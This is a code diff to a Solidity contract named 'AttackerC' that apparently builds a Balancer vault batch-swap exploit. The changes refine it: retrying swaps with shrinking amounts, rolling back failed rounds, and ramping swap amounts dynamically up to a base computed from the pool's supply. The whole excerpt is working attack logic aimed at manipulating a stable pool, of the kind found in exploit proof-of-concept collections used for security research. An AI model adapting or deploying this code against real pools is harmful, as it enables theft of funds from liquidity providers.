@@ -254,21 +254,30 @@ contract AttackerC {
                 userData: bytes("")
             });
             amount = helper.trim(balances[tokenIndexIn]);
-            for (uint256 j = 0; j < 3; ++j) {
-                try helper.swapGivenOut(balances, scalingFactors, tokenIndexOut, tokenIndexIn, amount, amplificationParameter, swapFee) returns (uint256[] memory newBalances) {
-                    buffer[stepCount++] = IBalancerVault.BatchSwapStep({
-                        poolId: poolId,
-                        assetInIndex: indexOut,
-                        assetOutIndex: indexIn,
-                        amount: amount,
-                        userData: bytes("")
-                    });
-                    balances = newBalances;
-                    amount = balances[tokenIndexOut];
+            {
+                bool swap3ok = false;
+                for (uint256 j = 0; j < 3; ++j) {
+                    try helper.swapGivenOut(balances, scalingFactors, tokenIndexOut, tokenIndexIn, amount, amplificationParameter, swapFee) returns (uint256[] memory newBalances) {
+                        buffer[stepCount++] = IBalancerVault.BatchSwapStep({
+                            poolId: poolId,
+                            assetInIndex: indexOut,
+                            assetOutIndex: indexIn,
+                            amount: amount,
+                            userData: bytes("")
+                        });
+                        balances = newBalances;
+                        amount = balances[tokenIndexOut];
+                        swap3ok = true;
+                        break;
+                    } catch {
+                        amount = (amount * 9) / 10;
+                        continue;
+                    }
+                }
+                if (!swap3ok) {
+                    // Rollback the swap1+swap2 steps from this failed round
+                    stepCount -= 2;
                     break;
-                } catch {
-                    amount = (amount * 9) / 10;
-                    continue;
                 }
             }
         }
@@ -288,23 +297,22 @@ contract AttackerC {
         IBalancerVault.BatchSwapStep[] memory buffer = new IBalancerVault.BatchSwapStep[](MAX_STEPS);
         uint256 amount = 1e4;
         uint256 stepCount = 0;
-        for (uint256 round = 0; round < 3; ++round) {
+
+        // Dynamic ramp: stop when amount reaches get_base(a) to match pool supply
+        uint256 a = actualSupply * 10030 / 10000;
+        uint256 base = helper.get_base(a);
+
+        bool useAsset0 = true;
+        while (amount < base) {
             buffer[stepCount++] = IBalancerVault.BatchSwapStep({
                 poolId: poolId,
-                assetInIndex: 0,
+                assetInIndex: useAsset0 ? 0 : 2,
                 assetOutIndex: 1,
                 amount: amount,
                 userData: bytes("")
             });
             amount = amount * 1e3;
-            buffer[stepCount++] = IBalancerVault.BatchSwapStep({
-                poolId: poolId,
-                assetInIndex: 2,
-                assetOutIndex: 1,
-                amount: amount,
-                userData: bytes("")
-            });
-            amount = amount * 1e3;
+            useAsset0 = !useAsset0;
         }
 
         buffer[stepCount++] = IBalancerVault.BatchSwapStep({
